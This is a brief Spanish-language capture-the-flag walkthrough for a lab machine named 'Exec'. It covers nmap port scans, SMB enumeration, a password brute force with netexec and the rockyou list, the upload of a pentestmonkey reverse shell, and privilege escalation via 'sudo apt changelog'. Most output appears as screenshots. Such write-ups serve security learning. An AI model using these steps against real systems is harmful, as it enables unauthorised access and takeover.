# Máquina Exec

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 192.168.42.148

![alt text](image-1.png)


### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80,139,445 vvv -Pn 192.168.42.148

![alt text](image-2.png)

### Explotación

Enumeramos samba:

enum4linux 192.168.42.148

![alt text](image-3.png)

Hacemos fuerza bruta:

sudo netexec smb 192.168.42.148 -u 's3cur4' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding | grep -v "STATUS_LOGON_FAILURE"

![alt text](image-4.png)

Enumerar recursos compartidos para s3cur4:

smbmap -H 192.168.42.148 -u s3cur4 -p 123456

![alt text](image-5.png)

Entonces lo que vi fue que estamos conectados al servidor web y podemos subir archivos, por lo tanto subí una reverse shell cuyo código es de pentesteMonkey

![alt text](image-6.png)

nos ponemos en escucha con netcat y luego accedemos por url a la reverse shell :

![alt text](image-7.png)

![alt text](image-8.png)

### Escalar privilegios

![alt text](image-9.png)

luego ejecutamos:

sudo -u root /usr/bin/apt changelog apt

![alt text](image-10.png)

### user.txt

![alt text](image-11.png)

### root.txt

![alt text](image-12.png)
